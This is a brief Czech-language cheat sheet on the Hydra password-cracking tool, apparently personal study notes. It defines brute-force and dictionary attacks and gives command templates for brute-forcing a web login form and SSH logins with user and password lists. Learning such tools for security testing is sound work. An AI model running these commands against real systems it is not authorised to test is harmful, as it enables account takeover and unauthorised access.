hydra = brute force, slovníkový útok

brute force = zkouší všechny možné kombinace

slovníkový = předpřipravený seznam pravděpodobných hesel

hydra pro web formular = hydra -L loginy.txt -P passwords.txt -t 4 ipadresa nebo domena http-post-form "/url:name ve formulari pro jmeno=^USER^& name formulari pro heslo=^PASS^& name ve formulari pro submit button=hodnota ve value:to co to vypise kdyz zadam nespravne heslo"

ssh priklad = hydra -L users.txt -P passwords.txt ssh://ip adresa -t 4

